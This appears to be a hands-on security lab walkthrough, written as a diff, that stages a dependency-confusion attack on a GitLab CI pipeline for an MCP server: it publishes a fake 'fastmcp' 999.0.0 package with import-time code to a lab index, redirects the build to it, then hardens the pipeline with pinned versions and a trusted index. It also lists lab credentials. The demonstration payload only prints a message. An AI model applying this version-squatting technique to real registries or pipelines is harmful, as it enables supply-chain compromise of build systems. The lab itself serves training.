@@ -1,0 +1,194 @@
+Execute a Poisoned Pipeline Attack Against an MCP Deployment\
+
+git config --global user.email "root@gitlab-ce-tozq793q.lab.practical-devsecops.training"
+
+git config --global user.name "root"
+
+URL	https://gitlab-ce-tozq793q.lab.practical-devsecops.training
+Username	root
+Password	pdso-training
+
+Creating a GitLab Project
+Open the Create blank project page and use the following values:
+
+Field	Value
+Project Name	cmcp-expenseapprover
+Namespace	Select root
+Visibility Level	Public
+Initialize repository with a README	Unchecked
+
+git clone https://gitlab.practical-devsecops.training/marudhamaran/cmcp-expenseapprover.git && cd cmcp-expenseapprover
+
+Pointing the Repository to Your GitLab Instance
+
+git remote set-url origin https://gitlab-ce-tozq793q.lab.practical-devsecops.training/root/cmcp-expenseapprover.git
+
+d for credentials, use the following:
+
+Name	Value
+Username	root
+Password	pdso-training
+
+git push origin main
+
+Scaffolding the Initial Pipeline
+Create a .gitlab-ci.yml file with a placeholder build stage. A working placeholder confirms that the GitLab Runner is connected before adding the real dependency install logic in the next steps.
+
+
+cat > .gitlab-ci.yml <<'EOF'
+stages:
+  - build
+
+build-mcp-server:
+  stage: build
+  image: python:3.12
+  script:
+    - echo "Pipeline is active"
+EOF
+
+
+
+git add .gitlab-ci.yml
+git commit -m "Add placeholder build pipeline"
+git push origin main
+
+Open the pipeline at https://gitlab-ce-tozq793q.lab.practical-devsecops.training/root/cmcp-expenseapprover/pipelines and confirm the build-mcp-server job passes.
+
+mkdir -p /malicious-fastmcp-build
+cd /malicious-fastmcp-build
+
+cat > pyproject.toml <<'EOF'
+[build-system]
+requires = ["setuptools>=61.0"]
+build-backend = "setuptools.build_meta"
+
+[project]
+name = "fastmcp"
+version = "999.0.0"
+description = "For lab registry only; do not publish to public PyPI."
+requires-python = ">=3.10"
+dependencies = []
+
+[tool.setuptools.packages.find]
+where = ["."]
+EOF
+
+Writing the Import-Time Payload
+Create the package directory and write fastmcp/__init__.py with code that runs at import time. The print statement acts as evidence that the malicious package was loaded.
+
+mkdir -p fastmcp
+
+cat > fastmcp/__init__.py <<'EOF'
+print("Compromised from CI pipeline")
+__version__ = "999.0.0"
+EOF
+
+Installing Build and Upload Tooling
+Install build and twine if they are not already present.
+
+
+python3 -m pip install --upgrade build twine
+
+Building the Wheel
+Build both a wheel and a source distribution.
+
+
+python3 -m build
+
+Uploading to the Internal Index
+Upload with twine using the internal index URL.
+
+
+python3 -m twine upload --repository-url https://pypi-tozq793q.lab.practical-devsecops.training dist/*
+
+The malicious wheel is now available on the internal index. Browse to https://pypi-tozq793q.lab.practical-devsecops.training/simple/ to confirm the upload.
+
+Because the version is set to 999.0.0, pip will always prefer it over the real package when no exact version or index is specified in the pipeline.
+
+Updating the Pipeline Configuration
+Move back into the cmcp-expenseapprover project directory.
+
+
+cd /cmcp-expenseapprover
+
+cat > .gitlab-ci.yml <<'EOF'
+stages:
+  - build
+
+build-mcp-server:
+  stage: build
+  image: python:3.12
+  script:
+    - python -m pip install --upgrade pip
+    - python -m pip install --index-url https://pypi-tozq793q.lab.practical-devsecops.training/simple --trusted-host pypi-tozq793q.lab.practical-devsecops.training fastmcp
+    - python -c "import fastmcp"
+EOF
+
+Committing the Changes
+Stage the updated pipeline file, then commit and push.
+
+When prompted for credentials, use the following:
+
+Name	Value
+Username	root
+Password	pdso-training
+
+git add .gitlab-ci.yml
+git commit -m "Configure fastmcp install from internal index"
+git push origin main
+
+Checking the Pipeline
+Open the pipeline list at https://gitlab-ce-tozq793q.lab.practical-devsecops.training/root/cmcp-expenseapprover/pipelines.
+
+Control 1: Declare the Dependency With an Exact Pin
+Overwrite requirements.txt with a fully resolved set of pinned versions. The original file pinned httpx==0.28.0, but fastmcp==3.2.4 requires httpx>=0.28.1, so both lines must be updated together.
+
+
+cat > requirements.txt <<'EOF'
+fastapi==0.135.1
+uvicorn==0.41.0
+httpx==0.28.1
+mcp[cli]==1.26.0
+starlette==0.52.1
+fastmcp==3.2.4
+EOF
+
+Control 2: Restrict the Pipeline to a Trusted Index
+Overwrite .gitlab-ci.yml with a hardened build job. The install now reads from requirements.txt and points only to public PyPI, removing any dependency on the internal index.
+
+
+cat > .gitlab-ci.yml <<'EOF'
+stages:
+  - build
+
+build-mcp-server:
+  stage: build
+  image: python:3.12
+  script:
+    - python -m pip install --upgrade pip
+    - python -m pip install --index-url https://pypi.org/simple -r requirements.txt
+    - python -c "import fastmcp"
+EOF
+
+Committing the Hardened Configuration
+Stage all changed files and push.
+
+When prompted for credentials, use the following:
+
+Name	Value
+Username	root
+Password	pdso-training
+
+git add requirements.txt .gitlab-ci.yml
+git commit -m "Harden pipeline: declare fastmcp and restrict to public PyPI"
+git push origin main
+
+Verifying the Clean Build
+Open the new pipeline at https://gitlab-ce-tozq793q.lab.practical-devsecops.training/root/cmcp-expenseapprover/pipelines and click the build-mcp-server job.
+
+The log should show fastmcp resolving from https://pypi.org/simple and no longer printing Compromised from CI pipeline.
+
+pip download -r requirements.txt -d /tmp/whl && pip hash /tmp/whl/*.whl
+
+
+
